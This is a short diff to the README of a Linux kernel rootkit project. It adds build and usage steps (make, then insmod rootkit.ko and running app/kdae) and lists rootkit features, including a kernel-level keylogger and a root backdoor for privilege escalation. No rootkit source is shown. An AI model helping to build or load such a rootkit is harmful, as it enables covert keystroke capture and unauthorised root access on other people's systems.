@@ -2,6 +2,16 @@
 A long time ago, i tested rootkit in 32bit Linux kernel 2.6.35 version.<br>
 <br>
 <br>
+### Build<br>
+make<br>
+cd app && make<br>
+<br>
+<br>
+### Usage<br>
+insmod rootkit.ko<br>
+app/kdae<br>
+<br>
+<br>
 ### Rootkit skill
 <br>
 1. Kernel level keylogger<br>
@@ -18,7 +28,3 @@ A long time ago, i tested rootkit in 32bit Linux kernel 2.6.35 version.<br>
 <br>
 4. Root backdoor<br>
 &nbsp;You can privilege escalation to root user.<br>
-<br>
-<br>
-### Build<br>
-AAAA
